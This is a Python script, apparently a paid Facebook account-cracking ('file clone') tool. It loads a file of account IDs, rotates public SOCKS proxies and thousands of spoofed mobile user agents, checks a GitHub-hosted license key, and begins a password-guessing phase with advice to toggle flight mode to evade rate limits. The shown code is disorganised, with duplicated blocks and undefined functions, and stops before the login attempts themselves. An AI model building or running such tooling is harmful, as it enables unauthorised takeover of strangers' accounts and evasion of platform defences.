import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()


print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
time.sleep(2)
get_ua_list = requests.get(" https://github.com/SUPRAJ-8/APPROVALXTOXIC/blob/main/APPROVAL.txt ").text.splitlines()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
prinCP=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,115)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    

for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
    d=random.randrange(10,200)
    e='0.4844.88 '
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(9000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
    
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for x in range(10000):
    aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
    b=random.choice(['4','5','6','7','8','9','10','11','12'])
    c='ASUS_I006D Build/RKQ1.201022.002'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 Sleipnir/3.5.28'
    uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uakua)
    
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def TUTULj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
print("\033[1;37m [\u001b[36m•\033[1;37m] UPDATES DONE \033[1;37m")
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    os.system('xdg-open ')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
logo ="""
 \033[1;91m_____ _____  _____ ____ 
 \033[1;92m|_   _/ _ \ \/ |_ _/ ___|
 \033[1;93m  | || | | \  / | | |    
 \033[1;94m  | || |_| /  \ | | |___ 
 \033[1;95m  |_| \___/_/\_|___\____|VERSION:\u001b[36m V7\033[1;37m
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [+] AUTHOR    \033[1;91m: \033[1;92mSUPRAJ                            ┃
 ┃ [+] TOOL      \033[1;91m: \033[1;92mFILE CLONE                        ┃
 ┃ [+] STATUS    \033[1;91m: \033[1;92mPAID                              ┃
 ┃ [+] SYSTEM    \033[1;91m: \033[1;92mDATA[BEST] & WIFI\u001b[36m V7\033[1;37m              ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
-----------------------------------------------"""   
#------------------[ APPROVAL SYSTEM ]-------------------#

# Approval function
def approval():
    # Pull from Git repository
    os.system('git pull')
    time.sleep(1)

    # Generate a unique ID
    uuid = str(os.geteuid()) + "69" + str(os.geteuid())
    id = "SUPRAJ-" + "".join(uuid)

    # Clear the screen and display banner and info
    clear()
    info()

    # Display message about the paid tool and print the generated ID
    animation("\033[1;37m [\u001b[36m•\033[1;37m] This Is a Paid Tool. You Need Approval To Use This Tool \033[1;37m")
    print("\033[1;37m [\u001b[36m•\033[1;37m] Your Key: \u001b[36m" + id)
    time.sleep(0.1)
    print("\033[1;37m--------------------------------------------------")

    try:
        # Fetch data from the URL containing approval keys
        httpCaht = requests.get("https://github.com/SUPRAJ-8/APPROVALXTOXIC/blob/main/APPROVAL.txt").text
        
        # Check if the generated ID is approved
        if id in httpCaht:
            animation(">> Your Key Has Been Approved !!!")
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            animation(">> Sorry, Your Key Has Not Been Approved ")
            time.sleep(0.1)
            input(' >> Click Enter And Send Your Key To Author')
            os.system('xdg-open https://www.facebook.com/profile.php?id=100042145964429&mibextid=LQQJ4d')
            time.sleep(1)
            exit()
    except Exception as e:
        # Handle error if fetching data fails
        animation(" >> Error: {}".format(e))
        time.sleep(2)
        exit()

# Define info function
def info():
    # Your info code here
    pass

# Define animation function
def animation(msg):
    # Your animation code here
    print(msg)

# Call the approval function
approval()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print("\033[1;37m[\u001b[36m•\033[1;37m] TODAY'S DATE :\033[1;93m "+date)
    print('\033[0;97m-----------------------------------------------')
    print(f"""[\u001b[36m1\033[1;37m] CRACK FILE  """)
    print(f"""[\u001b[36m2\033[1;37m] CONTACT ADMIN""")
    print("""[\u001b[36m0\033[1;37m] LOGOUT""")
    print('\033[0;97m-----------------------------------------------')
    HEART = input('\033[1;37m[\u001b[36m•\033[1;37m] CHOOSE: ')
    if HEART in ['111']:
        login()
        dump_massal()
    elif HEART in ['1']:
        crackfile()
    elif HEART in ['2','02']:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100042145964429&mibextid=LQQJ4d')
        os.system("python TOXIC.py")
    elif HEART in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m-----------------------------------------------')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m-----------------------------------------------')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
 
#-------------[ CRACK-FROM-FILE ]------------------#

import time

def crackfile():
    while True:
        print('\033[0;97m-----------------------------------------------')
        filename = input(' [\u001b[36m•\033[1;37m] Enter The Name Of File : ')
        o = '/sdcard/'+filename  # Form the complete file path
        try:
            with open(filename) as file:
                lines = file.read().splitlines()
            break  # Exit the loop if the file is successfully opened
        except FileNotFoundError:
            print('\033[0;97m-----------------------------------------------')
            print(' [×] FILE NOT FOUND')
            input(" Please Press Enter to retry...")
    
    # Assuming `id` is defined elsewhere in your code
    for line in lines:
        id.append(line)
    
    # Call the setting function
    setting()

def setting():
    # Define your setting function here
    pass

#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print('\033[0;97m-----------------------------------------------')
    print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
    print(" [\u001b[36m2\033[1;37m] ONLY NEW IDZ")
    print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ")
    print('\033[0;97m-----------------------------------------------')
    hu = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\033[0;97m-----------------------------------------------')
    print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
    print('\033[0;97m-----------------------------------------------')
    print(" [\u001b[36m1\033[1;37m] METHOD 1")
    print(" [\u001b[36m2\033[1;37m] METHOD 2")
    print('\033[0;97m-----------------------------------------------')
    hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
    print('\033[0;97m-----------------------------------------------')                              
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    print(' [\u001b[36m•\033[1;37m] DO YOU WANT TO SHOW CP IDZ? (Y/N) ')
    print('\033[0;97m-----------------------------------------------')       
    bau = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
    print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
    print('\033[0;97m-----------------------------------------------')
    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
    print('\033[0;97m-----------------------------------------------')
